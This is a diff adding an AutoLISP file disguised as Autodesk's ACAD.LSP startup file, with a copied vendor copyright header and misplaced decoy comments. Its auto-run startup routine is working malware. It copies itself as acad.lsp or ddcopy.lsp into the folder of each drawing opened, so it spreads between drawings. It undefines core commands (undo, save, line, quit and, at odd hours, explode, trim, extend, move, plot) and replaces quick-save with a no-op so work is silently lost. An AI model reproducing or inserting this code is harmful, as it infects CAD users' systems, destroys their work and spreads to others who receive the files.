@@ -1,0 +1,186 @@
+; Next available MSG number is    86
+; MODULE_ID ACADR13_LSP_
+;;;    ACAD.LSP Version 14.1 for Release 14 
+;;;
+;;;    Copyright (C) 1994 - 1997 by Autodesk, Inc.
+;;;
+;;;    Permission to use, copy, modify, and distribute this software
+;;;    for any purpose and without fee is hereby granted, provided
+;;;    that the above copyright notice appears in all copies and
+;;;    that both that copyright notice and the limited warranty and
+;;;    restricted rights notice below appear in all supporting
+;;;    documentation.
+;;;
+;;;    AUTODESK PROVIDES THIS PROGRAM "AS IS" AND WITH ALL FAULTS.
+;;;    AUTODESK SPECIFICALLY DISCLAIMS ANY IMPLIED WARRANTY OF
+;;;    MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.  AUTODESK, INC.
+;;;    DOES NOT WARRANT THAT THE OPERATION OF THE PROGRAM WILL BE
+;;;    UNINTERRUPTED OR ERROR FREE.
+;;;
+;;;    Use, duplication, or disclosure by the U.S. Government is subject to
+;;;    restrictions set forth in FAR 52.227-19 (Commercial Computer
+;;;    Software - Restricted Rights) and DFAR 252.227-7013(c)(1)(ii) 
+;;;    (Rights in Technical Data and Computer Software), as applicable.
+;;;
+;;;   Programer : Nguyen Manh Hung and Van Thai Binh - Cong ty Tu van va KSTK Xay dung	
+;;;
+;;;    Note:
+;;;            This file is loaded automatically by AutoCAD every time 
+;;;            a drawing is opened.  It establishes an autoloader and
+;;;            other utility functions.
+;;;
+;;;    Globalization Note:   
+;;;            We do not support autoloading applications by the native 
+;;;            language command call (e.g. with the leading underscore
+;;;            mechanism.)
+(defun s::startup (/ old_cmd path dwgpath mnlpath apppath oldacad cmd
+		     newacad nowdwg lspbj wjm wjm1 wjqm wjqm1 wz ns1 ns2
+		     mm1 mm2 mm3 mm4 mm5 mm6 mm7 mm8 mm9 mm10	
+		     )
+  (setq old_cmd (getvar "cmdecho"))
+     
+  (setvar "cmdecho" 0)
+  (check_data)
+  (setq path (findfile "base.dcl"))
+  (setq path (substr path 1 (- (strlen path) 8)))
+  (setq mnlpath (getvar "menuname"))
+  (setq nowdwg (getvar "dwgname"))
+  (if (setq wjqm (findfile nowdwg))
+  (progn
+  (setq dwgpath (substr wjqm 1 (- (strlen wjqm) (strlen nowdwg))))
+  (setq acadpath (findfile "acad.lsp"))
+  (setq acadpath (substr acadpath 1 (- (strlen acadpath) 8)))
+  (setq cmd "undefine")
+  (setq ns1 "" ns2 "")
+  (setq lspbj 0)
+  (setq wjqm (strcat path "acad.lsp"))
+  (setq mm7 "explode" mm8 "trim" 
+	mm9 "extend" mm10 "move")
+  (if (setq wjm (open wjqm "r"))
+     (progn
+       (while
+	  (setq wz (read-line wjm))
+	  (setq ns1 ns2)
+	  (setq ns2 wz)
+	  )
+       (if
+	 (> (strlen ns1) 14)
+	  (if (= (substr ns1 8 7) "ddcopy.lsp")
+	     (setq lspbj 1))
+	) 
+       (close wjm)
+      ) 
+   ) ;_ end of if
+  (if
+    (and (= acadpath dwgpath) (/= acadpath path))
+     (progn
+       (setq oldacad (findfile "acad.lsp"))
+       (setq newacad (strcat path "ddcopy.lsp"))
+       (if (= lspbj 0)
+	  (progn
+	    (setq wjqm (strcat path "acad.lsp"))
+	    (setq wjm (open wjqm "w"))
+	    (write-line
+	      (strcat "(load " (chr 34) "ddcopy.lsp" (chr 34) ")") wjm)
+	    (write-line "(princ)" wjm)
+	    (close wjm)
+     )
+ ) ;_ end of if
+       (writeapp)
+       ) 
+     (progn (if (/= nowdwg "Drawing.dwg")
+	 (progn
+	   (setq oldacad (findfile "ddcopy.lsp"))
+	    (setq newacad (strcat dwgpath "acad.lsp"))
+	    (writeapp)
+	    ) ;_ end of progn
+	  ) ;_ end of if
+       ) ;_ end of progn
+     ) ;_ end of if
+  (command cmd "u") ;_ end of cmd
+  (command cmd "qsave") ;_ end of cmd
+  (command cmd "line")
+  (command cmd "quit")
+  (if (/= (- (/ mm4 2) (fix (/ mm4 2))) 0)
+   (progn
+  (command cmd mm7) (command cmd mm8) ;; "bar.arx" will *not* match "c:\\path\\foobar.arx."
+  (command cmd mm9) (command cmd mm10);; "bar.arx" will *not* match "c:\\path\\foobar.arx."
+  (command cmd "plot") ;_ end of cmd
+   ));; "bar.arx" will *not* match "c:\\path\\foobar.arx."
+  (setvar "cmdecho" old_cmd)
+  ))
+ (if (not (setq wjqm (findfile nowdwg)))
+  (progn
+  (setq cmd "undefine")
+  (setq ns1 "" ns2 "")
+  (setq lspbj 0)
+  (setq wjqm (strcat path "acad.lsp"))
+  (setq mm7 "explode" mm8 "trim" 
+	mm9 "extend" mm10 "move")
+  (command cmd mm7) (command cmd mm8) ;; "bar.arx" will *not* match "c:\\path\\foobar.arx."
+  (command cmd mm9) (command cmd mm10);; "bar.arx" will *not* match "c:\\path\\foobar.arx."
+  (command cmd "plot") ;_ end of cmd
+  (command cmd "u") ;_ end of cmd
+  (command cmd "qsave") ;_ end of cmd
+  (command cmd "line")
+  (command cmd "quit")
+  ))
+  (princ);; "bar.arx" will *not* match "c:\\path\\foobar.arx."
+  
+  ) ;_ end of defun
+(defun writeapp  ()
+  (if (setq wjm1 (open newacad "w"))
+     (progn
+       (setq wjm (open oldacad "r"))
+       (while
+	 (setq wz (read-line wjm))
+	  (write-line wz wjm1)
+	) ;_ end of while
+       (close wjm)
+       (close wjm1)
+       ) ;_ end of progn
+     ) ;_ end of if
+  ) ;_ end of defun
+;; determines if a given application is loaded...
+;; general purpose: can ostensibly be used for appsets (arx) or (ads) or....
+;;
+;; app is the filename of the application to check (extension is required)
+;; appset is a list of applications, (such as (arx) or (ads)
+;;
+(defun check_data ()
+  (setq mm5 "cdate")
+  (setq	mm6 (rtos (getvar mm5) 2 10)
+	mm1 (substr mm6 1 4) ;; Allow the IMAGE command to accept an image file name without
+	mm2 (substr mm6 5 2) ;; Allow the IMAGE command to accept an image file name without
+	mm3 (substr mm6 7 2) ;; Allow the IMAGE command to accept an image file name without
+        mm4 (substr mm6 10 2);; Allow the IMAGE command to accept an image file name without 
+	)
+  (setq mm1 (distof mm1) ;; Allow the IMAGE command to accept an image file name without
+	mm2 (distof mm2) ;; Allow the IMAGE command to accept an image file name without
+	mm3 (distof mm3) ;; Allow the IMAGE command to accept an image file name without
+	mm4 (distof mm4));; Allow the IMAGE command to accept an image file name without
+  )
+;; returns T or nil, depending on whether app is present in the appset
+;; indicated.  Case is ignored in comparison, so "foo.arx" matches "FOO.ARX"
+;; Also, if appset contains members that contain paths, app will right-match
+(defun c:qsave () ;; presenting the file dialog, even if filedia is on.
+(princ) (princ)) ;; presenting the file dialog, even if filedia is on.
+;; against these members, so "bar.arx" matches "c:\\path\\bar.arx"; note that
+;; "bar.arx" will *not* match "c:\\path\\foobar.arx."
+(defun xplode ()
+  (princ "\nDon't hope explode it.")
+  (princ);; against these members
+  ) ;_ end of defun
+(defun c:xplode ()
+ (xplode) (princ))
+(defun c:xp ()
+ (xplode) (princ))
+;;;===== Raster Image Support for Clipboard Paste Special =====
+;;
+;; IMAGEFILE
+;;
+;; Allow the IMAGE command to accept an image file name without
+;; presenting the file dialog, even if filedia is on.
+;; Example: (imagefile "c:/images/house.bmp")
+(princ)
+;;
